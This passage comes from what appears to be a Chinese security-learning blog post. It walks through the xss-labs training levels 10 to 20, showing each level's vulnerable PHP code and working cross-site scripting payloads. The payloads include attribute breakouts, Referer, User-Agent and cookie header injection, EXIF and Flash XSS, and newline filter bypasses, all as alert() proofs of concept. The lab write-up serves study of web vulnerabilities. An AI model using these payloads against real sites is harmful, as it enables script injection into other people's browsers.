<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3 align=center&gt;payload的长度:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"&lt;/h3&gt;"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>熟悉的过滤，重点关注t_sort参数即可，这里在经过两个简单校验之后就直接插入到了input事件标签中，绕过原理很容易知道，但是这里的type确实hidden。</p>
<p>我们可以直接F12手动除掉type，当然也可以直接payload手动构造</p>
<pre><code class="hljs js">t_sort=<span class="hljs-string">" type="</span><span class="hljs-string">" onclick=alert('hacker')//</span></code></pre>
<h2 id="level-11">level-11</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"keyword"</span>];
<span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"t_sort"</span>];
<span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_REFERER'</span>];
<span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$str11</span>);
<span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"&lt;"</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$str22</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h2 align=center&gt;没有找到和"</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"相关的结果.&lt;/h2&gt;"</span>.<span class="hljs-string">'&lt;center&gt;</span>
<span class="hljs-string">&lt;form id=search&gt;</span>
<span class="hljs-string">&lt;input name="t_link"  value="'</span>.<span class="hljs-string">'" type="hidden"&gt;</span>
<span class="hljs-string">&lt;input name="t_history"  value="'</span>.<span class="hljs-string">'" type="hidden"&gt;</span>
<span class="hljs-string">&lt;input name="t_sort"  value="'</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">'" type="hidden"&gt;</span>
<span class="hljs-string">&lt;input name="t_ref"  value="'</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">'" type="hidden"&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&lt;/center&gt;'</span>;
<span class="hljs-meta">?&gt;</span>
&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3 align=center&gt;payload的长度:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"&lt;/h3&gt;"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里的keyword与t_sort都进行了有效过滤，但关注http_referer会发现没有任何过滤，直接bp修改即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240203111520196.png" alt="image-20240203111520196"></p>
<p>修改referer头即可</p>
<h2 id="level-12">level-12</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"keyword"</span>];
<span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"t_sort"</span>];
<span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_USER_AGENT'</span>];
<span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$str11</span>);
<span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"&lt;"</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$str22</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h2 align=center&gt;没有找到和"</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"相关的结果.&lt;/h2&gt;"</span>.<span class="hljs-string">'&lt;center&gt;</span>
<span class="hljs-string">&lt;form id=search&gt;</span>
<span class="hljs-string">&lt;input name="t_link"  value="'</span>.<span class="hljs-string">'" type="hidden"&gt;</span>
<span class="hljs-string">&lt;input name="t_history"  value="'</span>.<span class="hljs-string">'" type="hidden"&gt;</span>
<span class="hljs-string">&lt;input name="t_sort"  value="'</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">'" type="hidden"&gt;</span>
<span class="hljs-string">&lt;input name="t_ua"  value="'</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">'" type="hidden"&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&lt;/center&gt;'</span>;
<span class="hljs-meta">?&gt;</span>
&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3 align=center&gt;payload的长度:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"&lt;/h3&gt;"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>与上一关类似，只不过注入点在ua头，不再赘述</p>
<h2 id="level-13">level-13</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">"user"</span>, <span class="hljs-string">"call me maybe?"</span>, <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>);
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"keyword"</span>];
<span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"t_sort"</span>];
<span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"user"</span>];
<span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$str11</span>);
<span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"&lt;"</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$str22</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h2 align=center&gt;没有找到和"</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"相关的结果.&lt;/h2&gt;"</span>.<span class="hljs-string">'&lt;center&gt;</span>
<span class="hljs-string">&lt;form id=search&gt;</span>
<span class="hljs-string">&lt;input name="t_link"  value="'</span>.<span class="hljs-string">'" type="hidden"&gt;</span>
<span class="hljs-string">&lt;input name="t_history"  value="'</span>.<span class="hljs-string">'" type="hidden"&gt;</span>
<span class="hljs-string">&lt;input name="t_sort"  value="'</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">'" type="hidden"&gt;</span>
<span class="hljs-string">&lt;input name="t_cook"  value="'</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">'" type="hidden"&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&lt;/center&gt;'</span>;
<span class="hljs-meta">?&gt;</span>
&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3 align=center&gt;payload的长度:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"&lt;/h3&gt;"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>依旧老套路，注入点在cookie处</p>
<h2 id="level-14">level-14</h2>
<p>这题环境有问题，就直接看网上的思路了：exif xss</p>
<p>Exif XSS 漏洞是一种安全漏洞，存在于图片的 Exif（Exchangeable Image File Format）数据中。<br>
Exif 数据是嵌入在数字图像文件中的元数据，包含有关图像的信息，如拍摄日期、相机型号、GPS 坐标等。浏览器和其他应用程序通常会解析和显示这些数据。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240203113227216.png" alt="image-20240203113227216"></p>
<p>当存在 Exif XSS 漏洞时，攻击者可以在图像的 Exif 数据中插入恶意的 JavaScript 代码。当用户加载带有恶意 Exif 数据的图像时，浏览器或其他应用程序可能会错误地解析恶意代码，并在受害者的浏览器上执行它。</p>
<p>脚本如下：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> PIL.ExifTags <span class="hljs-keyword">as</span> ExifTags
<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image

<span class="hljs-comment"># 打开图像文件</span>
image = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">'初始.jpg'</span>)

<span class="hljs-comment"># 获取图像的 Exif 数据</span>
exif_data = image._getexif()

<span class="hljs-comment"># 将 Exif 数据转为可修改的字典格式</span>
exif_dict = <span class="hljs-built_in">dict</span>(exif_data)

<span class="hljs-comment"># 修改 Exif 数据</span>
exif_dict[ExifTags.TAGS[<span class="hljs-string">'Make'</span>]] = <span class="hljs-string">'xss语句'</span>
exif_dict[ExifTags.TAGS[<span class="hljs-string">'Model'</span>]] = <span class="hljs-string">'xss语句'</span>

<span class="hljs-comment"># 将修改后的 Exif 数据重新写回图像</span>
exif_bytes = ExifTags.exif_dict_to_bytes(exif_dict)
image.save(<span class="hljs-string">'改后.jpg'</span>, exif=exif_bytes)</code></pre>
<p>之后思路就是先修改iframe标签，接着上传图片加载即可，具体可参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_77485708/article/details/132097198">[网络安全]xss-labs level-14 解题详析</a></p>
<h2 id="level-15">level-15</h2>
<pre><code class="hljs php">&lt;script src=<span class="hljs-string">"https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js"</span>&gt;&lt;/script&gt;

<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"src"</span>];
<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;body&gt;&lt;span class="ng-include:'</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>可以看到这里有一个ng-include属性，我们简单了解一下</p>
<p>这题考察 <code>Angular JS</code> 的 <code>ng-include</code> 用法，具体可以参考这篇资料：<a target="_blank" rel="noopener" href="http://www.runoob.com/angularjs/ng-ng-include.html">AngularJS ng-include 指令</a></p>
<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。<code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。</p>
<pre><code class="hljs php">level14.php?src=<span class="hljs-string">"level1.php?name=&lt;img src=x onerror=alert('XSS')&gt;"</span></code></pre>
<pre><code class="hljs plaintext">特别值得注意的几点如下：
 
1.ng-include,如果单纯指定地址，必须要加引号
 
2.ng-include,加载外部html，script标签中的内容不执行
 
3.ng-include,加载外部html中含有style标签样式可以识别</code></pre>
<h2 id="level-16">level-16</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"keyword"</span>]);
<span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"script"</span>,<span class="hljs-string">"&amp;nbsp;"</span>,<span class="hljs-variable">$str</span>);
<span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">" "</span>,<span class="hljs-string">"&amp;nbsp;"</span>,<span class="hljs-variable">$str2</span>);
<span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"/"</span>,<span class="hljs-string">"&amp;nbsp;"</span>,<span class="hljs-variable">$str3</span>);
<span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"	"</span>,<span class="hljs-string">"&amp;nbsp;"</span>,<span class="hljs-variable">$str4</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;center&gt;"</span>.<span class="hljs-variable">$str5</span>.<span class="hljs-string">"&lt;/center&gt;"</span>;
<span class="hljs-meta">?&gt;</span>
&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3 align=center&gt;payload的长度:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str5</span>).<span class="hljs-string">"&lt;/h3&gt;"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里过滤掉了 script 标签，可以尝试使用其他标签通过事件来弹窗，但是也过滤了空格。</p>
<p>可以使用如下符号替代空格</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>URL 编码</th>
</tr>
</thead>
<tbody>
<tr>
<td>回车 (CR)</td>
<td>%0d</td>
</tr>
<tr>
<td>换行 (LF)</td>
<td>%0a</td>
</tr>
</tbody>
</table>
<pre><code class="hljs js">&lt;img%0Asrc=”<span class="hljs-number">111</span>”%0Aonerror=<span class="hljs-title function_">alert</span>(<span class="hljs-string">'xss'</span>)&gt;
<span class="language-xml">&lt;img%0Asrc="1"%0Aonmouseover="alert(1)"&gt;  </span></code></pre>
<h2 id="level-17">level-17</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;embed src=index.png?"</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"arg01"</span>]).<span class="hljs-string">"="</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"arg02"</span>]).<span class="hljs-string">" width=100% heigth=100%&gt;"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240203114422207.png" alt="image-20240203114422207"></p>
<p>总的来说<code>&lt;embed&gt;</code>标签就是引入一个<code>swf文件</code>到浏览器端，并且它的src属性值没有添加引号，所以不用闭合，但这里需要用支持flash插件的浏览器才可以回显swf区域，大家可以下载，或者去后台修改引入的文件如：index.png，如下图</p>
<pre><code class="hljs js">onmouseover=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)</code></pre>
<h2 id="level-18">level-18</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;embed src=index.png?"</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"arg01"</span>]).<span class="hljs-string">"="</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"arg02"</span>]).<span class="hljs-string">" width=100% heigth=100%&gt;"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>没什么变化，用上一关的payload即可</p>
<h2 id="level-19">level-19</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;embed src="xsf03.swf?'</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"arg01"</span>]).<span class="hljs-string">"="</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"arg02"</span>]).<span class="hljs-string">'" width=100% heigth=100%&gt;'</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>跟前几关差不多，但src加了双引号来闭合，但很明显有HTML实体化函数，我们无法闭合双引号，参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/103213877">Level 19 Flash XSS</a>与<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30702413/article/details/99326627">Flash XSS 漏洞详解</a></p>
<pre><code class="hljs plaintext">Flash XSS（Cross-Site Scripting）是指针对使用Adobe Flash技术开发的应用程序的跨站脚本攻击。

Flash是一种用于创建富媒体和互动内容的广泛使用的技术，将恶意Flash文件嵌入到受信任的网页中，当用户访问包含恶意Flash文件的页面时，Flash文件会在用户的浏览器中执行。</code></pre>
<p>这关用到的是Flash Xss注入,其实就是往Flash里面插入一段js代码，然后手动执行嘛，构造payload</p>
<pre><code class="hljs js">?arg01=version&amp;arg02=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"javascript:alert()"</span>&gt;</span>here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre>
<h2 id="level-20">level-20</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;embed src="xsf04.swf?'</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"arg01"</span>]).<span class="hljs-string">"="</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"arg02"</span>]).<span class="hljs-string">'" width=100% heigth=100%&gt;'</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>同上一关一样有双引号，还是要flash插入js代码</p>
<pre><code class="hljs js">?arg01=id&amp;arg02=xss\<span class="hljs-string">"))}catch(e){alert(1)}//</span></code></pre>
<h1 id="0x04-参考文章">0x04 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/257881.html">关于floor()报错注入，你真的懂了吗？</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/autopwn/p/13705489.html">基础汇总-sqlilab-Less-1-20</a></p>
<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/01/xss.html">XSS 从零开始</a></p>
<p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1160258">文件上传绕过姿势整理</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10515?time__1311=mq%2BxBDyGDQdWu40vm0D97Du7rUQiKix">文件上传绕过思路总结</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/02/02/chang-gui-lou-dong-xue-xi-zong-jie/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/02/02/chang-gui-lou-dong-xue-xi-zong-jie/')">常规漏洞学习总结</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/02/02/chang-gui-lou-dong-xue-xi-zong-jie/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=常规漏洞学习总结&amp;url=http://hybcx.xyz/2024/02/02/chang-gui-lou-dong-xue-xi-zong-jie/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>基本知识<span class="tagsPageCount">21</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/24/ctf-shua-ti-zhi-lu/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CISCN国赛</div></div></a></div><div class="next-post pull-right"><a href="/2024/02/06/thm-windows-quan-xian-ti-sheng/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM-Windows权限提升</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/07/27/ajax-xiang-jie/" title="Ajax详解"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-07-27</div><div class="title">Ajax详解</div></div></a></div><div><a href="/2023/11/12/flask-pin-ma-xue-xi/" title="Flask-PIN码学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-11-12</div><div class="title">Flask-PIN码学习</div></div></a></div><div><a href="/2023/08/06/docker-jian-jie/" title="docker基础"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-08-06</div><div class="title">docker基础</div></div></a></div><div><a href="/2024/02/27/jwt-gong-ji-xue-xi/" title="JWT攻击学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-27</div><div class="title">JWT攻击学习</div></div></a></div><div><a href="/2024/04/09/php-opcachegetshell/" title="PHP-OPcacheGetshell学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-04-09</div><div class="title">PHP-OPcacheGetshell学习</div></div></a></div><div><a href="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/" title="Phar反序列化"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-11-13</div><div class="title">Phar反序列化</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" 